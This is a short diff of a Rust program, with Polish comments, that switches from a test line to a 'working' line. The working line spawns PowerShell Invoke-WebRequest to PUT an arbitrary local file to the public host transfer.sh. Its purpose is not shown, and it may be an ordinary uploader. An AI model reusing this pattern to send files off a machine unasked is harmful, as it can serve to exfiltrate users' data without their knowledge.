@@ -22,9 +22,9 @@ fn main() {
       else {
         Command::new("powershell")
           // ! Działająca wersja
-          // .args(&["/c","Invoke-WebRequest","-Uri",&format!("https://transfer.sh/{var}"),"-Method Put", "-InFile",var]) 
+          .args(&["/c","Invoke-WebRequest","-Uri",&format!("https://transfer.sh/{var}"),"-Method Put", "-InFile",var]) 
           // ! TESTOWA wersja
-          .args(&["/c","Invoke-WebRequest","-Uri","https://transfer.sh/tak.txt","-Method Put", "-InFile",".\\plik.txt"])
+          // .args(&["/c","Invoke-WebRequest","-Uri","https://transfer.sh/tak.txt","-Method Put", "-InFile",".\\plik.txt"])
           .spawn()
           .expect("Failed to upload file");
       }
